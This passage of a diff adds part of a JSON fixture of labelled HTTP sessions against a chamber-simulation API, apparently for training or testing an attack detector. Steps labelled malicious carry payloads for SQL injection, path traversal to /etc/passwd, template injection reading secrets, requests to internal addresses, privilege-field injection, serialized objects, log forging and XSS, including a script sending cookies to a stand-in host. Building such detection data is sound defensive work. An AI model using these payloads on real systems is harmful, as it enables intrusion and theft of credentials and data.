+          "headers": {"Authorization": "Bearer tokenCDE"},
+          "body": null,
+          "note": "The client checks chamber cham-050."
+        }
+      ]
+    },
+    {
+      "session_id": "sess151",
+      "client_ip": "192.168.35.20",
+      "steps": [
+        {
+          "id": "sess151-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user51", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess151-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenFGH"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess151-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/admin/users",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenFGH"},
+          "body": null,
+          "note": "The client accesses an unauthorized admin path."
+        },
+        {
+          "id": "sess151-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-051",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenFGH"},
+          "body": null,
+          "note": "The client checks chamber cham-051."
+        }
+      ]
+    },
+    {
+      "session_id": "sess152",
+      "client_ip": "10.122.33.44",
+      "steps": [
+        {
+          "id": "sess152-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess152-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user52", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess152-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenIJK"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess152-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenIJK", "Content-Type": "application/json"},
+          "body": {"name": "Test", "volume_cubic_meters": 10.0, "role": "superuser"},
+          "note": "The client injects a privileged role field."
+        },
+        {
+          "id": "sess152-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-052",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenIJK"},
+          "body": null,
+          "note": "The client checks chamber cham-052."
+        }
+      ]
+    },
+    {
+      "session_id": "sess153",
+      "client_ip": "172.45.10.20",
+      "steps": [
+        {
+          "id": "sess153-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user53", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess153-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenLMN"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess153-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers/../../../etc/passwd",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenLMN"},
+          "body": null,
+          "note": "The client performs directory traversal."
+        },
+        {
+          "id": "sess153-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-053",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenLMN"},
+          "body": null,
+          "note": "The client checks chamber cham-053."
+        }
+      ]
+    },
+    {
+      "session_id": "sess154",
+      "client_ip": "192.168.40.25",
+      "steps": [
+        {
+          "id": "sess154-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess154-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user54", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess154-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenOPQ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess154-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenOPQ", "Content-Type": "application/json"},
+          "body": {"name": "<script>document.location='http://ev.com/?c='+document.cookie</script>", "volume_cubic_meters": 14.0},
+          "note": "The client passes browser-executed code."
+        },
+        {
+          "id": "sess154-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-054",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenOPQ"},
+          "body": null,
+          "note": "The client checks chamber cham-054."
+        }
+      ]
+    },
+    {
+      "session_id": "sess155",
+      "client_ip": "10.133.44.55",
+      "steps": [
+        {
+          "id": "sess155-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user55", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess155-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenRST"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess155-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers/cham-055/simulate",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenRST", "Content-Type": "application/json"},
+          "body": {"ambient_temperature_celsius": 18.0, "host": "http://127.0.0.1:22"},
+          "note": "The client references an internal port."
+        },
+        {
+          "id": "sess155-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-055/simulations",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenRST"},
+          "body": null,
+          "note": "The client checks simulations."
+        }
+      ]
+    },
+    {
+      "session_id": "sess156",
+      "client_ip": "172.50.22.33",
+      "steps": [
+        {
+          "id": "sess156-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess156-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user56", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess156-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenUVW"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess156-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenUVW", "Content-Type": "application/json"},
+          "body": {"name": "{{config.__class__.__init__.__globals__}}", "volume_cubic_meters": 20.0},
+          "note": "The client injects a template expression."
+        },
+        {
+          "id": "sess156-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-056",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenUVW"},
+          "body": null,
+          "note": "The client checks chamber cham-056."
+        }
+      ]
+    },
+    {
+      "session_id": "sess157",
+      "client_ip": "192.168.45.30",
+      "steps": [
+        {
+          "id": "sess157-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user57", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess157-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess157-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ", "Content-Type": "application/json"},
+          "body": {"name": "rO0ABXNyACpvcmcuYXBhY2h...", "volume_cubic_meters": 25.0},
+          "note": "The client passes a serialized object."
+        },
+        {
+          "id": "sess157-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-057",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client checks chamber cham-057."
+        }
+      ]
+    },
+    {
+      "session_id": "sess158",
+      "client_ip": "10.144.55.66",
+      "steps": [
+        {
+          "id": "sess158-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess158-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user58", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess158-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess158-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC", "Content-Type": "application/json"},
+          "body": {"name": "Test\n[INFO] 2026-10-28 Process finished successfully", "volume_cubic_meters": 30.0},
+          "note": "The client passes a newline and a log stamp."
+        },
+        {
+          "id": "sess158-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-058",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC"},
+          "body": null,
+          "note": "The client checks chamber cham-058."
+        }
+      ]
+    },
+    {
+      "session_id": "sess159",
+      "client_ip": "172.55.33.44",
+      "steps": [
+        {
+          "id": "sess159-s01",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"},
+          "body": null,
+          "note": "The client uses an old browser."
+        },
+        {
+          "id": "sess159-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user59", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess159-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess159-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-059",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF"},
+          "body": null,
+          "note": "The client checks chamber cham-059."
+        }
+      ]
+    },
+    {
+      "session_id": "sess160",
+      "client_ip": "192.168.50.35",
+      "steps": [
+        {
+          "id": "sess160-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user60", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess160-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess160-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": "10 UNION SELECT password,username FROM users--"},
+          "headers": {"Authorization": "Bearer tokenGHI"},
+          "body": null,
+          "note": "The client performs a query injection."
+        },
+        {
+          "id": "sess160-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-060",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI"},
+          "body": null,
+          "note": "The client checks chamber cham-060."
+        }
+      ]
+    },
+    {
+      "session_id": "sess161",
+      "client_ip": "10.155.66.77",
+      "steps": [
+        {
+          "id": "sess161-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess161-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user61", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess161-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess161-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/admin/logs",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL"},
+          "body": null,
+          "note": "The client accesses an unauthorized admin path."
+        },
+        {
+          "id": "sess161-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-061",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL"},
+          "body": null,
+          "note": "The client checks chamber cham-061."
+        }
+      ]
+    },
+    {
+      "session_id": "sess162",
+      "client_ip": "172.60.44.55",
+      "steps": [
+        {
+          "id": "sess162-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user62", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess162-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess162-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO", "Content-Type": "application/json"},
+          "body": {"name": "Lab", "volume_cubic_meters": 10.0, "privilege_level": "administrator"},
+          "note": "The client injects an unallowed privilege field."
+        },
+        {
+          "id": "sess162-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-062",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO"},
+          "body": null,
+          "note": "The client checks chamber cham-062."
+        }
+      ]
+    },
+    {
+      "session_id": "sess163",
+      "client_ip": "192.168.55.40",
+      "steps": [
+        {
+          "id": "sess163-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess163-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user63", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess163-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess163-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers/../../etc/hosts",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "The client performs directory traversal."
+        },
+        {
+          "id": "sess163-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-063",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "The client checks chamber cham-063."
+        }
+      ]
+    },
+    {
+      "session_id": "sess164",
+      "client_ip": "10.166.77.88",
+      "steps": [
+        {
+          "id": "sess164-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user64", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess164-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess164-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU", "Content-Type": "application/json"},
+          "body": {"name": "<script>alert('XSS')</script>", "volume_cubic_meters": 11.0},
+          "note": "The client passes browser-executed code."
+        },
+        {
+          "id": "sess164-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-064",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU"},
+          "body": null,
+          "note": "The client checks chamber cham-064."
+        }
+      ]
+    },
+    {
+      "session_id": "sess165",
+      "client_ip": "172.65.55.66",
+      "steps": [
+        {
+          "id": "sess165-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess165-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user65", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess165-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess165-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers/cham-065/simulate",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX", "Content-Type": "application/json"},
+          "body": {"ambient_temperature_celsius": 21.0, "url": "http://192.168.1.1/admin"},
+          "note": "The client references an internal address."
+        },
+        {
+          "id": "sess165-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-065/simulations",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client checks simulations."
+        }
+      ]
+    },
+    {
+      "session_id": "sess166",
+      "client_ip": "192.168.60.45",
+      "steps": [
+        {
+          "id": "sess166-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user66", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess166-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess166-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA", "Content-Type": "application/json"},
+          "body": {"name": "{{config.secret_key}}", "volume_cubic_meters": 13.0},
+          "note": "The client injects a template expression."
+        },
+        {
+          "id": "sess166-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-066",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA"},
+          "body": null,
+          "note": "The client checks chamber cham-066."
+        }
+      ]
+    },
+    {
+      "session_id": "sess167",
+      "client_ip": "10.177.88.99",
+      "steps": [
+        {
+          "id": "sess167-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess167-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user67", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess167-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess167-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD", "Content-Type": "application/json"},
+          "body": {"name": "rO0ABXNyACpvcmMu...", "volume_cubic_meters": 19.0},
+          "note": "The client passes a serialized object payload."
+        },
+        {
+          "id": "sess167-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-067",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client checks chamber cham-067."
+        }
+      ]
+    },
+    {
+      "session_id": "sess168",
+      "client_ip": "172.70.66.77",
+      "steps": [
+        {
+          "id": "sess168-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user68", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess168-s02",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG", "Content-Type": "application/json"},
+          "body": {"name": "Chamber\n[DEBUG] 2026-10-28 Connection established", "volume_cubic_meters": 21.0},
+          "note": "The client passes a newline and a log stamp."
+        },
+        {
+          "id": "sess168-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess168-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-068",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client checks chamber cham-068."
+        }
+      ]
+    },
+    {
+      "session_id": "sess169",
+      "client_ip": "192.168.65.50",
+      "steps": [
+        {
+          "id": "sess169-s01",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0)"},
+          "body": null,
+          "note": "The client uses an old browser signature."
+        },
+        {
+          "id": "sess169-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user69", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess169-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess169-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-069",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ"},
+          "body": null,
+          "note": "The client checks chamber cham-069."
+        }
+      ]
+    },
+    {
+      "session_id": "sess170",
+      "client_ip": "10.188.99.11",
+      "steps": [
+        {
+          "id": "sess170-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user70", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess170-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess170-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": "10 UNION SELECT credit_card,pin FROM accounts--"},
+          "headers": {"Authorization": "Bearer tokenKLM"},
+          "body": null,
+          "note": "The client performs a query injection."
+        },
+        {
+          "id": "sess170-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-070",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM"},
+          "body": null,
+          "note": "The client checks chamber cham-070."
+        }
+      ]
+    },
+    {
+      "session_id": "sess171",
+      "client_ip": "172.75.77.88",
+      "steps": [
+        {
+          "id": "sess171-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess171-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user71", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess171-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess171-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/admin/config",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP"},
+          "body": null,
+          "note": "The client accesses an unauthorized admin path."
+        },
+        {
+          "id": "sess171-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-071",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP"},
+          "body": null,
+          "note": "The client checks chamber cham-071."
+        }
+      ]
+    },
+    {
+      "session_id": "sess172",
+      "client_ip": "192.168.70.55",
+      "steps": [
+        {
+          "id": "sess172-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user72", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess172-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess172-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS", "Content-Type": "application/json"},
+          "body": {"name": "Lab", "volume_cubic_meters": 10.0, "access_role": "superadmin"},
+          "note": "The client injects an unallowed access role field."
+        },
+        {
+          "id": "sess172-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-072",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS"},
+          "body": null,
+          "note": "The client checks chamber cham-072."
+        }
+      ]
+    },
+    {
+      "session_id": "sess173",
+      "client_ip": "10.199.11.22",
+      "steps": [
+        {
+          "id": "sess173-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess173-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user73", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess173-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess173-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers/../../etc/issue",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV"},
+          "body": null,
+          "note": "The client performs directory traversal."
+        },
+        {
+          "id": "sess173-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-073",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV"},
+          "body": null,
+          "note": "The client checks chamber cham-073."
+        }
+      ]
+    },
+    {
+      "session_id": "sess174",
+      "client_ip": "172.80.88.99",
+      "steps": [
+        {
+          "id": "sess174-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user74", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess174-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess174-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY", "Content-Type": "application/json"},
+          "body": {"name": "<svg onload=alert(1)>", "volume_cubic_meters": 15.0},
+          "note": "The client passes browser-executed code."
+        },
+        {
+          "id": "sess174-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-074",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY"},
+          "body": null,
+          "note": "The client checks chamber cham-074."
+        }
+      ]
+    },
+    {
+      "session_id": "sess175",
+      "client_ip": "192.168.75.60",
+      "steps": [
+        {
+          "id": "sess175-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess175-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user75", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess175-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenZAB"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess175-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers/cham-075/simulate",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenZAB", "Content-Type": "application/json"},
+          "body": {"ambient_temperature_celsius": 19.0, "target": "http://10.0.0.5/internal"},
+          "note": "The client references an internal address."
+        },
+        {
+          "id": "sess175-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-075/simulations",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenZAB"},
+          "body": null,
+          "note": "The client checks simulations."
+        }
+      ]
+    },
+    {
+      "session_id": "sess176",
+      "client_ip": "10.211.22.33",
+      "steps": [
+        {
+          "id": "sess176-s01",
